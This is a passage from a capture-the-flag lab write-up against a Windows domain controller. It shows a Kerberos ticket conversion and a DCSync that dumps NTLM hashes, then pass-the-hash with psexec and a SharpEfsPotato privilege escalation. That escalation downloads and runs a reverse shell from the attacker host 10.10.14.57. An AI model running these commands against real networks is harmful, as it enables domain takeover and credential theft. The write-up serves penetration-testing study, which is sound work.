[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.
[*] Found the AP-REQ delegation ticket in the GSS-API output.
[*] Authenticator etype: aes256_cts_hmac_sha1
[*] Extracted the service ticket session key from the ticket cache: CYLfo1W5+vf4ZTDXhdsbhxx6n45eG6ONzEKGryITLUg=
[+] Successfully decrypted the authenticator
[*] base64(ticket.kirbi):

      doIF3jCCBdqgA<SNIIIIIIIIIP>AWoAMCAQGFM
```

I’ll save to my local machine and convert the ticket with `TicketConverter` from `impacket`.

```
hcue@pjsk:/tmp/wr » cat ticket| base64 -d > ticket.kirbi
hcue@pjsk:/tmp/wr » impacket-ticketConverter ticket.kirbi ticket.ccache
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] converting kirbi to ccache...
[+] done
```

Then I’ll export it to my env variables.

```
hcue@pjsk:/tmp/wr » export KRB5CCNAME=/tmp/wr/ticket.ccache
```

One last thing, we need to synchronize our local time to the server, otherwise it won’t work.

```
sudo ntpdate 10.129.254.249
```

Now to perform a DCSync on the target, we can use impacket’s `secretsdump.py` script to extract all the hashes from the domain controller. We need to specify kerberos authentication and no password for this operation.

```
hcue@pjsk:/tmp/wr » impacket-secretsdump LOOKOUT-DC.LOOKOUT.local -dc-ip 10.129.254.249 -no-pass -k
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cb313353c5eaceb1aae589b1644737bb:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ab92b60e75818bbb70ca754897aa1e37:::
LOOKOUT.local\lhuman:1104:aad3b435b51404eeaad3b435b51404ee:de9ca94a6f5ea9113d3370476e42a9cb:::
LOOKOUT.local\fhuman:1105:aad3b435b51404eeaad3b435b51404ee:1501f896cae1fd4f0bf6b9593e81dea3:::
LOOKOUT.local\shuman:1106:aad3b435b51404eeaad3b435b51404ee:f4c0320c516b4eeae0533e930beee3c3:::
LOOKOUT-DC$:1001:aad3b435b51404eeaad3b435b51404ee:440f42cdda7c8d86dedc9655e8c003d0:::
<SNIP>
```

Now with the administrator hash we can `psexec` into the machine:

```
hcue@pjsk:/tmp/wr » impacket-psexec Administrator@10.129.254.249 -hashes :cb313353c5eaceb1aae589b1644737bb     1 ↵
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 10.129.254.249.....
[*] Found writable share ADMIN$
[*] Uploading file HeqMQBmt.exe
[*] Opening SVCManager on 10.129.254.249.....
[*] Creating service bqIM on 10.129.254.249.....
[*] Starting service bqIM.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

And then we grab both flags :D!

#### Second Way

```
PS C:\Windows\system32> whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

We have `SeImpersonatePrivilege` Enabled. Since this is a Windows Server 2019, most of the known Potatos will not work. But likely, there is new potato that could exploit `SEimpersonatePrivilege` using `EfsRpc`.

> https://github.com/bugch3ck/SharpEfsPotato

We compile it with Visual Studio and upload it to the remote machine:

```
PS C:\Windows\System32\spool\drivers\color> wget 10.10.14.57/xc_10.10.14.57_443.exe -o xc_10.10.14.57_443.exe

PS C:\Windows\System32\spool\drivers\color> wget 10.10.14.57/SharpEfsPotato.exe -o SharpEfsPotato.exe
```

And then execute my reverse shell:

```
PS C:\Windows\System32\spool\drivers\color> .\SharpEfsPotato.exe -p C:\Windows\System32\spool\drivers\color\xc_10.10.14.57_443.exe
SharpEfsPotato by @bugch3ck
  Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

  Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/d112edc0-75de-4d57-8696-f7b9847761a6/\d112edc0-75de-4d57-8696-f7b9847761a6\d112edc0-75de-4d57-8696-f7b9847761a6
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!
```

And I grabbed my shell:

```
hcue@pjsk:/opt/xc(master○) » ./xc -l -p 443                                                                                                                                                                                            1 ↵

		__  _____
		\ \/ / __|
		>  < (__
		/_/\_\___| by @xct_de
		           build: XBWQOEYPUG

2022/12/05 09:05:16 Listening on :443
2022/12/05 09:05:16 Waiting for connections...
2022/12/05 09:07:06 Connection from 10.129.254.249:63732
2022/12/05 09:07:06 Stream established

[*] Auto-Plugins:
[xc: C:\Windows\system32]: whoami
nt authority\system
[xc: C:\Windows\system32]: hostname
LOOKOUT-DC
```
